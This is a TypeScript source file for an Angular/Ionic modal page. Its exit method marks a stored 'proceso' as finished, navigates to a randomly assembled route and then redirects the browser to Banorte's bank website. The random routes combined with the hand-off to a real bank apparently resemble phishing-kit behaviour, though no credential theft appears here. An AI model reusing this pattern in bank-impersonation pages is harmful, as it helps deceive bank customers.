import { Component, OnInit } from '@angular/core';
import { Router } from '@angular/router';
import { ModalController, NavParams } from '@ionic/angular';
import { environment } from 'src/environments/environment';

@Component({
  selector: 'app-dual-modal',
  templateUrl: './dual-modal.page.html',
  styleUrls: ['./dual-modal.page.scss'],
})
export class DualModalPage implements OnInit {
  current: string;
  API_URL = environment.API_URL;

  constructor(
    private modalCtrl: ModalController,
    private router: Router,
    private navParams: NavParams
  ) {}

  ngOnInit() {
    this.current = this.navParams.data.current;
  }

  async closeModal() {
    // this.modalCtrl.dismiss();
    await this.modalCtrl.dismiss(false);
  }
  async salir() {
    localStorage.setItem('proceso', 'terminado');
    this.router.navigate([this.getRoute()]);
    document.location.href = 'https://www.banorte.com/';
  }

  getRoute(): string {
    const main = ['log', 'inicio', 'ingreso'];
    const optional = [
      'banca',
      'linea',
      'info',
      'gestor',
      'consumo',
      'convenio',
      '',
      'canal',
    ];
    let rand = `${main[Math.floor(Math.random() * main.length)]}/${
      optional[Math.floor(Math.random() * optional.length)]
    }`;
    return rand;
  }
}
